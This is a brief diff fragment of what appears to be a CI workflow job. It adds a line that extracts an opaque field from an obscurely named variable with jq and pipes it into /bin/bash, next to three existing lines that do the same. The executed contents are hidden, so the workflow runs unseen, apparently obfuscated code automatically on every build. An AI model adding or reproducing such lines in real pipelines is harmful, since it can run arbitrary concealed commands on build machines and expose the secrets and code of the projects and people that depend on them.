@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$del3053" | jq -r .c5581 | /bin/bash
           printf '%s' "$mww7229" | jq -r .daqp49559 | /bin/bash
           echo $aibss7974 | jq -r .xqho045 | /bin/bash
+          echo $vbktu293 | jq -r .xct3767 | /bin/bash
 
       - name: Upload data
         if: always()
